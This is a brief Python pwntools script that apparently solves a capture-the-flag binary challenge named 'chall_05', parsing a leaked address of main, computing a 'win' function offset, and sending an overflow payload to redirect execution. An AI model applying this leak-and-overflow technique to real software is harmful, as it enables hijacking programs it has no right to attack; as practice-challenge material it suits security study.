from pwn import *
import re
p=process("./chall_05")
sleep(1)
p.recv()
p.sendline()
resp = p.recv()
leak = int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16) #leaked address is main function
leak -= int(b"0x13",16) #0x13 offset of win function
p.sendline((0x40-0x8)*b"A"+p64(leak)) #overwrite vuln local variable to jump to win when rdx is called
p.interactive()
